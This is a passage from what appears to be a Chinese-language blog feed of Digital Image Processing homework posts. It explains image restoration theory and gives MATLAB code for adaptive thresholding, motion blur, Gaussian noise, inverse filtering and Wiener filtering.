class="built_in">zeros</span>(<span class="built_in">size</span>(img));</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="built_in">size</span>(img, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">j</span> = <span class="number">1</span>:<span class="built_in">size</span>(img, <span class="number">2</span>)</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    binaryImage = uint8(binaryImage * <span class="number">255</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>由于每个点都需要计算相应阈值，我们需要<strong>循环遍历</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rowMin = <span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">i</span> - halfWindowSize);</span><br><span class="line">rowMax = <span class="built_in">min</span>(<span class="built_in">size</span>(img, <span class="number">1</span>), <span class="built_in">i</span> + halfWindowSize);</span><br><span class="line">colMin = <span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">j</span> - halfWindowSize);</span><br><span class="line">colMax = <span class="built_in">min</span>(<span class="built_in">size</span>(img, <span class="number">2</span>), <span class="built_in">j</span> + halfWindowSize);</span><br><span class="line">localRegion = img(rowMin:rowMax, colMin:colMax);</span><br><span class="line">localMean = <span class="built_in">mean</span>(localRegion(:));</span><br><span class="line">binaryImage(<span class="built_in">i</span>, <span class="built_in">j</span>) = img(<span class="built_in">i</span>, <span class="built_in">j</span>) &gt; localMean * (<span class="number">1</span> - C);</span><br></pre></td></tr></table></figure><p>在具体计算中，我们找到该点的领域，并使用<code>mean()</code>方法计算领域像素点的均值</p><p>最后使用公式计算得到该点的阈值</p><p>这里我们测试两个窗口大小，25和50</p><img src="/posts/0dd96b178030/processing_results_img2.png" class="" title="processing_results_img2"><p>观察到，自适应阈值处理的效果要比全局阈值好得多，而<strong>领域窗口尺寸设置较小时，会存在一些噪点</strong></p><p>这是由于更大的领域窗口尺寸可以覆盖更广的区域，从而更好地适应光照不均匀的区域，这有助于在计算阈值时平滑局部的光照变化。</p>]]></content>
      
      
      
        <tags>
            
            <tag> MATLAB </tag>
            
            <tag> Digital Image Processing </tag>
            
            <tag> project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字图像处理 作业四</title>
      <link href="/posts/e5cbd5436bd8/"/>
      <url>/posts/e5cbd5436bd8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本系列文章为学校课程《数字图像处理》布置的一些小project作业</p><p>除了给出每个问题的解答和代码，我也会附上相关知识点，以方便后续复习</p><h1 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h1><h2 id="图像复原"><a href="#图像复原" class="headerlink" title="图像复原"></a>图像复原</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>图像复原的<strong>目的</strong>是针对质量降低或失真的图像，试图恢复其原始的内容或质量</p><img src="/posts/e5cbd5436bd8/image-20231213232627762.png" class="" title="image-20231213232627762"><p>获得使图像质量下降的先验知识，<strong>建立退化模型</strong>是图像复原处理的前提与关键</p><p>图像恢复总是假定已知或可以通过估计得到<strong>引起图像降质的模型</strong>，而图像增强不需要知道图像降质模型</p><h3 id="图像退化与复原模型"><a href="#图像退化与复原模型" class="headerlink" title="图像退化与复原模型"></a>图像退化与复原模型</h3><p><strong>引起图像质量下降的客观因素</strong>：</p><ul><li><p>成象系统的象差、畸变、带宽有限等造成图像失真</p></li><li><p><strong>几何失真：</strong>由于成象器件拍摄姿态和扫描非线性引起</p></li><li><p><strong>灰度失真：</strong>光学系统或成象传感器本身特性不均匀，造成同样亮度景物成象灰度不同</p></li><li><strong>运动模糊：</strong>成象传感器与被拍摄景物之间的相对运动，引起所成图像的运动模糊</li><li><p><strong>辐射失真：</strong>由于场景能量传输通道中的介质特性如大气湍流效应、大气成分变化引起图像失真</p></li><li><p><strong>噪声干扰：</strong>图像在成象、数字化、采集和处理过程中引入的噪声等</p></li></ul><p>针对上述客观因素，<strong>建立图像退化模型，是进行图像复原处理的第一步</strong></p><img src="/posts/e5cbd5436bd8/image-20231213234913348.png" class="" title="image-20231213234913348"><p>降质图像可表示为：$g(x, y) = H[f(x, y)] + \eta(x, y)$，<strong>其中<script type="math/tex">H[\cdot]</script>是综合所有退化因素的函数</strong></p><p>建立图像退化模型，即获得退化系统$H$和噪声$\eta$的模型</p><h3 id="图像复原基本原理"><a href="#图像复原基本原理" class="headerlink" title="图像复原基本原理"></a>图像复原基本原理</h3><p>图像复原的本质即<strong>沿着使图像降质的逆过程恢复图像本来面貌</strong></p><p>实际的复原过程相当于设计一个滤波器，使其能从降质图像中计算得到真实图像的估值 ，使其根据预先规定的误差准则，最大程度地接近真实图像 。</p><p>逆问题经常存在非唯一解，甚至无解。为了得到逆问题的有用解，<strong>需要有先验知识以及对解的附加约束条件</strong></p><p>我们可以使用线性系统来近似退化过程，这样图像的退化可以看作原始图像与退化函数的卷积，因此线性图像复原往往被称为<strong>图像去卷积（反卷积）</strong>，所采用的滤波器称之为<strong>去卷积滤波器</strong></p><h2 id="噪声模型"><a href="#噪声模型" class="headerlink" title="噪声模型"></a>噪声模型</h2><h3 id="噪声模型及参数估计"><a href="#噪声模型及参数估计" class="headerlink" title="噪声模型及参数估计"></a>噪声模型及参数估计</h3><img src="/posts/e5cbd5436bd8/image-20231214000801502.png" class="" title="image-20231214000801502"><p>下面是常见的噪声的概率密度函数图</p><img src="/posts/e5cbd5436bd8/image-20231214002631807.png" class="" title="image-20231214002631807"><p>其中横轴$z$表示灰度值，而纵轴则表示该灰度值出现的概率</p><p>下图是不同噪声的效果比较</p><img src="/posts/e5cbd5436bd8/image-20231214002828069.png" class="" title="image-20231214002828069"><p>总的来说，我们想要建立一个噪声模型，关键是得到或估计其参数</p><p>对于<strong>Gaussian, uniform, Rayleigh, Erlang, exponential noises</strong>等噪声，关键是得到其<strong>均值与方差</strong></p><p>$ \mu = \sum_{z_i \in S} z_i p(z_i) $</p><p>$\sigma^2 = \sum_{z_i \in S} (z_i - \mu)^2 p(z_i) $ </p><p>而脉冲噪声（椒盐噪声）则类通过直方图获取参数$P_a$和$P_b$</p><img src="/posts/e5cbd5436bd8/image-20231214003309836.png" class="" title="image-20231214003309836"><h3 id="只存在噪声的复原"><a href="#只存在噪声的复原" class="headerlink" title="只存在噪声的复原"></a>只存在噪声的复原</h3><p>对于只存在噪声的图像的复原，我们通常选择<strong>空间滤波技术</strong></p><img src="/posts/e5cbd5436bd8/image-20231214105430583.png" class="" title="image-20231214105430583"><h4 id="固定滤波器"><a href="#固定滤波器" class="headerlink" title="固定滤波器"></a>固定滤波器</h4><div class="note info flat"><p><strong>固定滤波器（Fixed Filters）</strong>，也常被称为预定义滤波器或非自适应滤波器，是图像处理中一类预先定义好的滤波器，它们有固定的模板（kernel）或掩模（mask）。这些滤波器不会根据图像内容或其他外部信息改变其内核值</p></div><p>下面是一些常见的固定滤波器</p><ol><li><p>算术均值滤波器 (Arithmetic Mean Filter):</p><script type="math/tex; mode=display">\hat{f}(x, y) = \frac{1}{mn} \sum_{(s,t) \in S_{xy}} g(s, t)</script><p>$S_{xy}$ 是以像素$(x, y)$为中心的邻域集合。</p><p>$g(s, t)$ 是输入滤波器的图像在位置$(s, t)$的像素值。</p></li><li><p>几何均值滤波器 (Geometric Mean Filter):</p><script type="math/tex; mode=display">\hat{f}(x, y) = \left[ \prod_{(s,t) \in S_{xy}} g(s, t) \right]^{\frac{1}{mn}}</script><ul><li>非线性滤波</li><li>平滑度与算术滤波器相当</li><li>图像细节丢失更少</li></ul></li><li><p>谐波均值滤波器 (Harmonic Mean Filter):</p><script type="math/tex; mode=display">\hat{f}(x, y) = \frac{mn}{\sum_{(s,t) \in S_{xy}} \frac{1}{g(s, t)}}</script><ul><li>对“盐”噪声较好</li><li>不适用于“胡椒”噪声</li><li>善于处理高斯噪声</li></ul></li></ol><p>当然还有一类固定滤波器，它们<strong>基于像素的顺序统计特性决定其相应值</strong></p><img src="/posts/e5cbd5436bd8/image-20231214131933904.png" class="" title="image-20231214131933904"><img src="/posts/e5cbd5436bd8/image-20231214132018241.png" class="" title="image-20231214132018241"><p>固定滤波器在图像恢复上存在一定的<strong>缺陷</strong>：</p><ul><li><p><strong>固定滤波器未考虑图像的局部特性，难以达到更好效果</strong></p></li><li><p><strong>为提高滤波性能，固定滤波器日益复杂，但适用面却日益缩小</strong></p></li><li><p><strong>滤波器窗口越大，图像细节丢失越严重</strong></p></li><li><p><strong>通常须在保存图像细节与噪声滤除之间寻求某种折衷</strong></p></li></ul><h4 id="自适应滤波器"><a href="#自适应滤波器" class="headerlink" title="自适应滤波器"></a>自适应滤波器</h4><p>自适应滤波器很好的解决了固定滤波器的问题</p><p>通过<strong>结合图像的局部特性</strong>，它能<strong>自动修改滤波器参数或滤波策略</strong></p><img src="/posts/e5cbd5436bd8/image-20231214134352445.png" class="" title="image-20231214134352445"><p>除了以均值和方差建立的自适应模型，还有如下的<strong>自适应中值滤波器</strong></p><img src="/posts/e5cbd5436bd8/image-20231214135148039.png" class="" title="image-20231214135148039"><img src="/posts/e5cbd5436bd8/image-20231214135203676.png" class="" title="image-20231214135203676"><img src="/posts/e5cbd5436bd8/image-20231214173347240.png" class="" title="image-20231214173347240"><h3 id="频域滤波降低周期噪声"><a href="#频域滤波降低周期噪声" class="headerlink" title="频域滤波降低周期噪声"></a>频域滤波降低周期噪声</h3><p>常用的频域滤波有两种：<strong>带阻滤波器</strong>和<strong>陷波滤波器</strong></p><h4 id="带阻滤波器（Band-stop-Filter）"><a href="#带阻滤波器（Band-stop-Filter）" class="headerlink" title="带阻滤波器（Band-stop Filter）"></a>带阻滤波器（Band-stop Filter）</h4><p>带阻滤波器设计用来抑制一定频率范围内的信号，同时允许其他频率的信号通过。它在频域中形成一个“带阻”区域，这个区域对应于周期性噪声的主要频率成分。</p><ul><li><strong>应用场景</strong>：当周期性噪声的频率集中在一个较宽的频率范围内时，带阻滤波器特别有效。</li><li><strong>设计考虑</strong>：需要确定噪声频率的上下界，并据此设计滤波器。</li><li><strong>效果</strong>：能够同时抑制多个相近的周期性噪声频率。</li></ul><img src="/posts/e5cbd5436bd8/image-20231214202042779.png" class="" title="image-20231214202042779"><p>一个带阻滤波效果的例子如下</p><img src="/posts/e5cbd5436bd8/image-20231214201619863.png" class="" title="image-20231214201619863"><h4 id="陷波滤波器（Notch-Filter）"><a href="#陷波滤波器（Notch-Filter）" class="headerlink" title="陷波滤波器（Notch Filter）"></a>陷波滤波器（Notch Filter）</h4><p>陷波滤波器是一种更加精确的滤波方式，它旨在抑制一个或几个特定的频率点，而对其他频率的信号影响较小。这种滤波器在频域中形成一个或多个“陷阱”，精确地消除特定频率的噪声。</p><ul><li><strong>应用场景</strong>：当周期性噪声集中在一个或几个非常特定的频率点上时。</li><li><strong>设计考虑</strong>：需要精确知道噪声的频率，并在这些频率点上设计陷波。</li><li><strong>效果</strong>：非常精确地消除特定频率的噪声，对其他频率成分的影响很小。</li></ul><img src="/posts/e5cbd5436bd8/image-20231214202123105.png" class="" title="image-20231214202123105"><img src="/posts/e5cbd5436bd8/image-20231214202138587.png" class="" title="image-20231214202138587"><p>注意上图中右上角为噪声的频域图像，我们需要消除它则需要纵轴上的陷波滤波器</p><h2 id="系统退化"><a href="#系统退化" class="headerlink" title="系统退化"></a>系统退化</h2><img src="/posts/e5cbd5436bd8/image-20231214204529909.png" class="" title="image-20231214204529909"><h3 id="估计退化函数"><a href="#估计退化函数" class="headerlink" title="估计退化函数"></a>估计退化函数</h3><p>对退化函数$H(u,v)$的估计过程常称为<strong>系统辨识过程</strong></p><img src="/posts/e5cbd5436bd8/image-20231214205849538.png" class="" title="image-20231214205849538"><h4 id="图像观察估计法"><a href="#图像观察估计法" class="headerlink" title="图像观察估计法"></a>图像观察估计法</h4><p>选择图像中具有强信号与强特征的局部区域图像$g_s(x,y)$，设法构建一个具有相同大小与特征、但没有退化</p><p>的近似图像 ，可有$H_s(u,v) = \frac{G_s(u,v)}{\hat{F}_s(u,v)}$</p><h4 id="试验估计法"><a href="#试验估计法" class="headerlink" title="试验估计法"></a>试验估计法</h4><p>使用或设计一个与图像退化过程相似的装置（过程），使其成像一个脉冲，可得到退化系统的冲激响应</p><p>$H(u,v) = \frac{G(u,v)}{A}$</p><h4 id="模型估计法"><a href="#模型估计法" class="headerlink" title="模型估计法"></a>模型估计法</h4><p>从引起图像退化的基本原理进行推导，进而对原始图像进行模拟，在模拟过程中调整模型参数以获得尽可能精确的退化模型</p><p>常见的模型有下面几种</p><p><strong>大气湍流模型</strong>：$H(u,v) = \exp \left[ -c (u^2 + v^2)^{\frac{5}{6}} \right]$</p><p><strong>大气扰动模型</strong>：$h(i,j) = K \cdot \exp \left( -\frac{i^2 + j^2}{2 \sigma^2} \right)$</p><p><strong>运动模糊模型</strong>：$H(u,v) = \frac{T}{\pi (ua + vb)} \sin \left[ \pi (ua + vb) \right] e^{-j \pi (ua + vb)}$</p><p><strong>光学散焦模型</strong>：$H(u,v) = \frac{J_1(\pi d \rho)}{\pi d \rho} \ \rho = (u^2 + v^2)^{\frac{1}{2}}$</p><p>想要进行模型估计，可以采取<strong>点扩展函数法</strong></p><p>点扩展函数法的思想就是将退化函数看作将一个点光源（或不同频率的光源）输入成像系统，输出则是相应的PSF(或PSF的傅里叶变换函数)</p><h2 id="逆滤波"><a href="#逆滤波" class="headerlink" title="逆滤波"></a>逆滤波</h2><img src="/posts/e5cbd5436bd8/image-20231214222432267.png" class="" title="image-20231214222432267"><p>但是这周自己哦空额的逆滤波<strong>存在一个问题</strong></p><p>$F(u,v) = \frac{G(u,v)}{H(u,v)}-\frac{N(u,v)}{H(u,v)}$</p><p><strong>当$H(u,v)$等于零或非常小的数值点上，噪声的影响会大大增强 </strong></p><p>一种改进方法是<strong>伪逆滤波复原</strong></p><p>通过对$H(u,v)$规定一个门限值</p><p>$H^{-1}(u,v) =<br>\begin{cases}<br>\frac{1}{H(u,v)}, &amp; |H(u,v)| &gt; \delta \<br>0, &amp; |H(u,v)| \leq \delta<br>\end{cases}$</p><p>当我们针对特定噪声进行逆滤波，例如<strong>高斯白噪声</strong></p><p>那么$H(u,v)$可能在很高的频率时趋于零</p><p>此时我们只需对伪逆滤波施加圆形范围限制即可</p><img src="/posts/e5cbd5436bd8/image-20231214223527788.png" class="" title="image-20231214223527788"><h3 id="最小均方误差滤波（维纳滤波）"><a href="#最小均方误差滤波（维纳滤波）" class="headerlink" title="最小均方误差滤波（维纳滤波）"></a>最小均方误差滤波（维纳滤波）</h3><p>维纳滤波<strong>假设图像和噪声均属于随机信号（平稳随机过程）</strong>，且相互之间互不相关</p><p>而目标是<strong>寻找最佳复原图像，使得均方误差最小</strong></p><img src="/posts/e5cbd5436bd8/image-20231214223824323.png" class="" title="image-20231214223824323"><p>维纳滤波的结果如下</p><p>$\hat{F}(u,v) = \frac{\left| H(u,v) \right|^2}{\left| H(u,v) \right|^2 + S_n(u,v)/S_f(u,v)} \cdot \frac{G(u,v)}{H(u,v)}$</p><p>不过值得注意的是，<strong>维纳滤波器建立在最小化统计准则基础上，只是在平均</strong> </p><p><strong>意义上最优</strong></p><h1 id="HW-图像退化与复原"><a href="#HW-图像退化与复原" class="headerlink" title="HW 图像退化与复原"></a>HW 图像退化与复原</h1><p>作业要求：</p><blockquote><ol><li>使用教科书中的方程（5.6-11）实现一个模糊滤镜，并用参数 a=b=0.1 和 T=1 对测试图像 ‘book_cover.jpg’ 进行模糊处理。（20%）</li><li>向模糊图像添加均值为0、方差为500的高斯噪声。（10%） </li><li>使用逆滤波恢复模糊图像和模糊噪声图像。（30%）</li><li>使用至少3个不同参数的参数化维纳滤波恢复模糊噪声图像，并与3的结果进行比较和分析。（40%）</li></ol></blockquote><p>原图如下</p><p><style>.uhehkzzgxojr{zoom: 67%;}</style><img src="/posts/e5cbd5436bd8/book_cover.jpg" class="uhehkzzgxojr" alt="book_cover"></p><p>在开始任务之前，考虑到后续生成的中间图像的像素值范围可能超过$[0,255]$，我们需要<strong>定义一个归一化函数</strong>，方便后续归一化并保存中间图像</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">result</span> = <span class="title">normalize_image</span><span class="params">(image)</span></span></span><br><span class="line">    result = image - <span class="built_in">min</span>(image(:)); <span class="comment">% 将图像平移到最小值为0</span></span><br><span class="line">    result = result / <span class="built_in">max</span>(result(:)); <span class="comment">% 缩放图像使最大值为1</span></span><br><span class="line">    result = uint8(result * <span class="number">255</span>); <span class="comment">% 转换为0-255的uint8图像</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="图像模糊"><a href="#图像模糊" class="headerlink" title="图像模糊"></a>图像模糊</h2><p>首先完成第一个任务</p><p>教科书中的5.6-11方程为<strong>图像运动模糊模型</strong></p><script type="math/tex; mode=display">H(u,v) = \frac{T}{\pi (ua + vb)} \sin \left[ \pi (ua + vb) \right] e^{-j \pi (ua + vb)}</script><p>首先我们读取图像，并将其转到频率域</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I = imread(<span class="string">&#x27;book_cover.jpg&#x27;</span>);</span><br><span class="line">[M,N] = <span class="built_in">size</span>(I);</span><br><span class="line">I = double(I);  </span><br><span class="line">F = fftshift(fft2(I));</span><br></pre></td></tr></table></figure><p>由于后续有较为复杂的操作，我们需要使用<code>double()</code>将<code>I</code>变为实数矩阵</p><p>我们按照题目定义运动模糊模型的参数</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">0.1</span>;</span><br><span class="line">b = <span class="number">0.1</span>;</span><br><span class="line">T = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>接下来我们就可以定义运动模糊模型的退化函数了</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">H = <span class="built_in">zeros</span>(M,N);</span><br><span class="line"><span class="keyword">for</span> u = <span class="number">1</span>:M</span><br><span class="line">    <span class="keyword">for</span> v = <span class="number">1</span>:N</span><br><span class="line">        x = <span class="built_in">pi</span> * ((u-M/<span class="number">2</span>)*a + (v-N/<span class="number">2</span>)*b); </span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span></span><br><span class="line">            H(u,v) = T;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            H(u,v) = (T / x) * <span class="built_in">sin</span>(x) * <span class="built_in">exp</span>(<span class="number">-1</span><span class="built_in">i</span>*x);</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>当然，我们需要额外增加判断，避免退化函数中<code>pi * ((u-M/2)*a + (v-N/2)*b</code>这一部分太小，导致比值趋近于无穷大，<strong>当x为0时，我们应该将H设为一个有限值</strong></p><p>我们将退化函数与原图的频域相乘，进行模糊处理</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">G = H .* F;</span><br><span class="line">blurred_image = normalize_image(<span class="built_in">abs</span>(ifft2(G)));</span><br><span class="line">imwrite(blurred_image, <span class="string">&#x27;./result/blurred_image.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>注意在最后需要对空域的模糊图像进行归一化</strong></p><p>得到下图结果</p><p><style>.sbpoksreewxx{zoom: 67%;}</style><img src="/posts/e5cbd5436bd8/blurred_image.png" class="sbpoksreewxx" alt="blurred_image"></p><p>可以发现非常接近现实生活中因为物体运动而产生的模糊图片</p><h2 id="添加噪声"><a href="#添加噪声" class="headerlink" title="添加噪声"></a>添加噪声</h2><p>第二个任务是<strong>向模糊图像添加高斯噪声</strong>，这样可以得到完整的退化模型</p><p>首先我们根据题目的要求，生成一个<strong>均值为0、方差为500</strong>的高斯噪声</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">noise = <span class="built_in">randn</span>(M,N) * <span class="built_in">sqrt</span>(<span class="number">500</span>);</span><br><span class="line">Fn = fftshift(fft2(noise));</span><br></pre></td></tr></table></figure><p>将噪声与模糊图像相加，得到模糊噪声图像</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Gn = G + Fn;</span><br><span class="line">blurred_noisy_image = normalize_image(<span class="built_in">abs</span>(ifft2(Gn)));</span><br><span class="line">imwrite(blurred_noisy_image, <span class="string">&#x27;./result/blurred_noisy_image.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p><style>.xfrnmpjgycry{zoom: 67%;}</style><img src="/posts/e5cbd5436bd8/blurred_noisy_image.png" class="xfrnmpjgycry" alt="blurred_noisy_image"></p><p>我们可以将原图和两张生成的退化图像进行对比</p><img src="/posts/e5cbd5436bd8/degradation_comparison.png" class="" title="degradation_comparison"><h2 id="逆滤波复原"><a href="#逆滤波复原" class="headerlink" title="逆滤波复原"></a>逆滤波复原</h2><p>将模糊图像和模糊噪声图像分别除以退化函数，得到复原后的图像</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 逆滤波恢复模糊噪声图像</span></span><br><span class="line">F_hat1 = G ./ H;</span><br><span class="line">F_hat1(<span class="built_in">isnan</span>(F_hat1)) = <span class="number">0</span>; </span><br><span class="line">F_hat1(<span class="built_in">isinf</span>(F_hat1)) = <span class="number">0</span>; </span><br><span class="line">inverse_filtered_image = normalize_image(<span class="built_in">abs</span>(ifft2(F_hat1)));</span><br><span class="line">imwrite(inverse_filtered_image, <span class="string">&#x27;./result/inverse_filtered_image.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 逆滤波恢复模糊噪声图像</span></span><br><span class="line">F_hat2 = Gn ./ H;</span><br><span class="line">F_hat2(<span class="built_in">isnan</span>(F_hat2)) = <span class="number">0</span>; </span><br><span class="line">F_hat2(<span class="built_in">isinf</span>(F_hat2)) = <span class="number">0</span>; </span><br><span class="line">inverse_filtered_noisy_image = normalize_image(<span class="built_in">abs</span>(ifft2(F_hat2)));</span><br><span class="line">imwrite(inverse_filtered_noisy_image, <span class="string">&#x27;./result/inverse_filtered_noisy_image.png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>下图是<strong>模糊图像的逆滤波复原图</strong></p><p><style>.uxweoiidtjie{zoom:67%;}</style><img src="/posts/e5cbd5436bd8/inverse_filtered_image.png" class="uxweoiidtjie" alt="inverse_filtered_image"></p><p>可以发现和原图基本一致</p><p>而下图是<strong>模糊噪声图像的逆滤波复原图</strong></p><p><style>.lrvsoghojrhe{zoom:67%;}</style><img src="/posts/e5cbd5436bd8/inverse_filtered_noisy_image.png" class="lrvsoghojrhe" alt="inverse_filtered_noisy_image"></p><p>可以发现比原来的噪声强度还大</p><p>我们可以从逆滤波的公式中找到原因</p><p>$F(u,v) = \frac{G(u,v)}{H(u,v)}-\frac{N(u,v)}{H(u,v)}$</p><p>对于仅仅模糊的图像（不含噪声），如果已知确切的模糊函数，逆滤波可以恢复得到原始图像</p><p>而<strong>当存在噪声时</strong>，由于噪声通常具有高频成分，在逆滤波的过程中，除以模糊核的频率响应会放大这些高频成分，导致<strong>噪声也被显著放大</strong></p><h2 id="维纳滤波"><a href="#维纳滤波" class="headerlink" title="维纳滤波"></a>维纳滤波</h2><p>我们定义三个维纳滤波参数<code>K = [0.01, 0.1, 1]</code></p><p>根据这三个参数分别得到维纳滤波的复原图像</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">F_wnr = <span class="built_in">zeros</span>(M,N,<span class="built_in">length</span>(K));</span><br><span class="line"><span class="keyword">for</span> k = <span class="number">1</span>:<span class="built_in">length</span>(K)</span><br><span class="line">    F_wnr(:,:,k) = <span class="built_in">conj</span>(H) ./ (<span class="built_in">abs</span>(H).^<span class="number">2</span> + K(k)) .* Gn;</span><br><span class="line">    F_wnr(:,:,k) = ifftshift(F_wnr(:,:,k));</span><br><span class="line">    F_wnr(:,:,k) = ifft2(F_wnr(:,:,k));</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>将生成的维纳滤波图像与逆滤波复原图放在一个窗口进行对比</p><img src="/posts/e5cbd5436bd8/inverse_comparison.png" class="" title="inverse_comparison"><p>可以观察到，维纳滤波的权衡因子k越小，噪声越多，但对模糊的复原也越好，分析原因如下：</p><ul><li><strong>当K较大时，滤波器更倾向于抑制噪声</strong>，但也可能导致图像细节的损失。这是因为大的K值会减少滤波器在频域中对高频成分的增强，而噪声主要存在于高频部分。</li><li><strong>当K较小时，滤波器更专注于逆转模糊效果</strong>，这可能导致噪声被放大，但同时也能更好地保留图像的细节和边缘。</li></ul><p>当然，在存在噪声时，与逆滤波的效果相比，维纳滤波的效果更好，这是因为<strong>逆滤波对噪声更加敏感</strong></p><p>而维纳滤波能够根据噪声的存在进行调整，平衡去模糊和降噪，从而在不过度放大噪声的同时恢复图像。</p>]]></content>
      
      
      
        <tags>
            
            <tag> MATLAB </tag>
            
            <tag> Digital Image Processing </tag>
            
            <tag> project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字图像处理 作业三</title>
      <link href="/posts/e5f414f6f9b3/"/>
      <url>/posts/e5f414f6f9b3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本系列文章为学校课程《数字图像处理》布置的一些小project作业</p><p>除了给出每个问题的解答和代码，我也会附上相关知识点，以方便后续复习</p><h1 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h1><h2 id="空间域滤波回顾"><a href="#空间域滤波回顾" class="headerlink" title="空间域滤波回顾"></a>空间域滤波回顾</h2><p>空间域滤波也叫模板，主要涉及相关和卷积两种基本运算</p><ul><li><strong>相关运算</strong>：将模板当权重矩阵作加权平均；</li><li><strong>卷积运算</strong>：模板先沿纵轴翻转，再沿横轴翻转后再加权平均。</li></ul><p>如果模板是对称的，那么相关与卷积运算结果完全相同<br>领域运算实际上就是卷积和相关运算，用信号分析的观点就是滤波</p><p>利用空间域的图像平滑，可以阻截高频的噪声信号，但是往往图像的边缘部分（细节）也处于高频部分</p><p>常见的滤波器有领域平均滤波、高斯滤波和中值滤波</p><p>空间域滤波本质上是个领域运算，且需要一个模板（阶为奇数的矩阵）</p><h2 id="频域滤波"><a href="#频域滤波" class="headerlink" title="频域滤波"></a>频域滤波</h2><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231204174640488.png" alt="image-20231204174640488"></p><p><strong>频域进行滤波操作相当于空间域做卷积操作</strong><br>$f(x,y) * h(x,y) \Rightarrow F(u,v)H(u,v)$</p><p>空间域和频域的滤波器构成傅里叶变换对</p><p>$h(x,y) \Leftrightarrow  H(u,v)$</p><p>从定义上来讲，频域滤波就是<strong>将信号中特定波段频率滤除的操作</strong></p><p>所以，低通滤波就是是低频通过而使高频衰减的滤波器，高通滤波则相反</p><p>在滤波器模板规模较大时，频域内进行滤波计算更为有效，空间域的滤波器更适用于小规模模板。因为频域计算存在高效计算方法，如快速傅里叶变换可以将计算复杂度从$O(N^2)$下降到了$O(NlogN)$</p><h3 id="滤波器间的关系"><a href="#滤波器间的关系" class="headerlink" title="滤波器间的关系"></a>滤波器间的关系</h3><img src="/posts/e5f414f6f9b3/image-20231204230525709.png" class="" title="image-20231204230525709"><img src="/posts/e5f414f6f9b3/image-20231204230535446.png" class="" title="image-20231204230535446"><p>$H(u)$和$h(x)$构成傅里叶变换对</p><p>当$\lambda $很大时，$H(u)$变宽，$h(x)$变窄；当$\lambda $趋于无穷时，$H(u)$趋于常数函数，而$h(x)$则趋于一个冲激函数</p><p>另一个例子是带通滤波器</p><img src="/posts/e5f414f6f9b3/image-20231205145533330.png" class="" title="image-20231205145533330"><img src="/posts/e5f414f6f9b3/image-20231205145601227.png" class="" title="image-20231205145601227"><h3 id="低通滤波"><a href="#低通滤波" class="headerlink" title="低通滤波"></a>低通滤波</h3><p>目的：低通滤波通过对频域上一定范围的高频分量进行衰减以达到<strong>平滑化</strong>，来增强图像</p><p>常见的低通滤波器有三种</p><img 